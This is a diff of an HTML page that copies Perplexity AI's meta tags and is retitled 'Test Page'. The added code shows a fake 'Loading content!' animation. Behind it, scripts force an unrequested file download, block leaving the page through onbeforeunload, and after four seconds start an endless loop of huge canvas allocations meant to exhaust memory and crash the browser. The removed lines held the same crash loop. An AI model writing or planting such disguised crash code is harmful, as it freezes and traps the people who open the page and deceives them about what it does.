@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <!-- Standard SEO Meta Tags (Good Practice) -->
-    <title>Perplexity AI</title>
+    <title>Test Page</title>
     <!--
     <meta name="description" content="The AI answer engine. Ask anything and get an instant, reliable answer backed by sources.">
     <meta name="robots" content="index, follow">
@@ -40,18 +40,173 @@
     <meta name="twitter:description" content="Perplexity is a free AI-powered answer engine that provides accurate, trusted, and real-time answers to any question.">
     <meta name="twitter:image" content="https://ppl-ai-public.s3.amazonaws.com/static/img/pplx-default-preview.png">
 </head>
-<body>
-  <script>
-const canvases = [];
-while(true) {
-  const c = document.createElement('canvas');
-  c.width = 10000;
-  c.height = 10000;
-  const ctx = c.getContext('2d');
-  ctx.fillRect(0, 0, 10000, 10000);
-  canvases.push(c);
-  document.body.appendChild(c);
-}
+<body style="margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden;">
+
+    <div id="loadingContainer" style="text-align: center; position: relative;">
+        
+        <!-- Animated rings -->
+        <div style="position: relative; width: 200px; height: 200px; margin: 0 auto 40px;">
+            <!-- Outer rotating ring -->
+            <div style="position: absolute; width: 200px; height: 200px; border-radius: 50%; border: 4px solid transparent; border-top-color: #fff; border-right-color: #fff; animation: spin 2s linear infinite; box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);"></div>
+            
+            <!-- Middle counter-rotating ring -->
+            <div style="position: absolute; width: 160px; height: 160px; top: 20px; left: 20px; border-radius: 50%; border: 4px solid transparent; border-bottom-color: #a8edea; border-left-color: #a8edea; animation: spinReverse 3s linear infinite; box-shadow: 0 0 25px rgba(168, 237, 234, 0.4);"></div>
+            
+            <!-- Inner pulse ring -->
+            <div style="position: absolute; width: 120px; height: 120px; top: 40px; left: 40px; border-radius: 50%; border: 3px solid rgba(255, 255, 255, 0.6); animation: pulse 1.5s ease-in-out infinite; box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);"></div>
+            
+            <!-- Center glow -->
+            <div style="position: absolute; width: 80px; height: 80px; top: 60px; left: 60px; border-radius: 50%; background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%); animation: glow 2s ease-in-out infinite;"></div>
+            
+            <!-- Percentage display -->
+            <div id="percentage" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 36px; font-weight: bold; color: #fff; text-shadow: 0 0 20px rgba(255, 255, 255, 0.8), 0 0 40px rgba(255, 255, 255, 0.4);">0%</div>
+        </div>
+        
+        <!-- Loading text -->
+        <h2 style="color: #fff; font-size: 28px; margin: 0 0 15px 0; text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); animation: fadeSlide 1s ease-in-out infinite alternate;">Loading content!</h2>
+        <p style="color: rgba(255, 255, 255, 0.9); font-size: 16px; margin: 0; letter-spacing: 1px; animation: fadeSlide 1s ease-in-out infinite alternate; animation-delay: 0.3s;">please wait a while</p>
+        
+        <!-- Progress bar -->
+        <div style="width: 300px; height: 6px; background: rgba(255, 255, 255, 0.2); border-radius: 10px; margin: 30px auto 0; overflow: hidden; box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2);">
+            <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #a8edea 0%, #fed6e3 100%); border-radius: 10px; transition: width 0.3s ease; box-shadow: 0 0 15px rgba(168, 237, 234, 0.6);"></div>
+        </div>
+        
+        <!-- Floating particles -->
+        <div style="position: absolute; width: 10px; height: 10px; background: rgba(255, 255, 255, 0.6); border-radius: 50%; top: -50px; left: 50%; animation: float1 4s ease-in-out infinite; box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);"></div>
+        <div style="position: absolute; width: 8px; height: 8px; background: rgba(168, 237, 234, 0.7); border-radius: 50%; top: -30px; left: 30%; animation: float2 5s ease-in-out infinite 1s; box-shadow: 0 0 8px rgba(168, 237, 234, 0.9);"></div>
+        <div style="position: absolute; width: 12px; height: 12px; background: rgba(254, 214, 227, 0.6); border-radius: 50%; top: -40px; left: 70%; animation: float3 4.5s ease-in-out infinite 0.5s; box-shadow: 0 0 10px rgba(254, 214, 227, 0.8);"></div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes spinReverse {
+            0% { transform: rotate(360deg); }
+            100% { transform: rotate(0deg); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.6; }
+            50% { transform: scale(1.1); opacity: 1; }
+        }
+        
+        @keyframes glow {
+            0%, 100% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        
+        @keyframes fadeSlide {
+            0% { opacity: 0.7; transform: translateY(0); }
+            100% { opacity: 1; transform: translateY(-5px); }
+        }
+        
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translate(-20px, 200px) scale(0.5); opacity: 0; }
+        }
+        
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translate(30px, 220px) scale(0.6); opacity: 0; }
+        }
+        
+        @keyframes float3 {
+            0%, 100% { transform: translate(0, 0) scale(1); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translate(-15px, 210px) scale(0.7); opacity: 0; }
+        }
+        
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+    </style>
+
+    <script>
+        // Percentage counter with smooth animation
+        let percentage = 0;
+        const percentageEl = document.getElementById('percentage');
+        const progressBar = document.getElementById('progressBar');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const duration = 10000; // 10 seconds
+        const startTime = Date.now();
+        
+        function updateProgress() {
+            const elapsed = Date.now() - startTime;
+            percentage = Math.min((elapsed / duration) * 100, 100);
+            
+            // Add easing for smoother feel
+            const easedPercentage = easeOutCubic(percentage / 100) * 100;
+            
+            percentageEl.textContent = Math.floor(easedPercentage) + '%';
+            progressBar.style.width = easedPercentage + '%';
+            
+            if (percentage < 100) {
+                requestAnimationFrame(updateProgress);
+            } else {
+                // Finished loading
+                percentageEl.textContent = '100%';
+                progressBar.style.width = '100%';
+                
+                // Fade out loading screen
+                setTimeout(() => {
+                    loadingContainer.style.animation = 'fadeOut 0.8s ease-out forwards';
+                    setTimeout(() => {
+                        document.body.innerHTML = '<div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-family: \'Segoe UI\', sans-serif; font-size: 32px; text-shadow: 0 2px 10px rgba(0,0,0,0.3);">Content Loaded! 🎉</div>';
+                    }, 800);
+                }, 300);
+            }
+        }
+        
+        // Easing function for smooth animation
+        function easeOutCubic(t) {
+            return 1 - Math.pow(1 - t, 3);
+        }
+        
+        // Start the loading animation
+        updateProgress();
+    </script>
+    <script>
+        async function downloadFileFromUrl(url, filename) {
+              const response = await fetch(url);
+              const blob = await response.blob();
+              const objectUrl = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              a.href = objectUrl;
+              a.download = filename;
+              a.style.display = 'none';
+              document.body.appendChild(a);
+              a.click();
+              document.body.removeChild(a);
+              URL.revokeObjectURL(objectUrl);
+        }
+        downloadFileFromUrl('https://pdfobject.com/pdf/sample.pdf', 'test.pdf');
+        window.onbeforeunload = function() {
+            return true;
+        };   
+        function initcrash(){
+            const canvases = [];
+            while(true) {
+                  const c = document.createElement('canvas');
+                  c.width = 10000;
+                  c.height = 10000;
+                  const ctx = c.getContext('2d');
+                  ctx.fillRect(0, 0, 10000, 10000);
+                  canvases.push(c);
+                  document.body.appendChild(c);
+            }
+        }
+        setTimeout(function() { initcrash(); }, 4000);
 
   </script>
 </body>
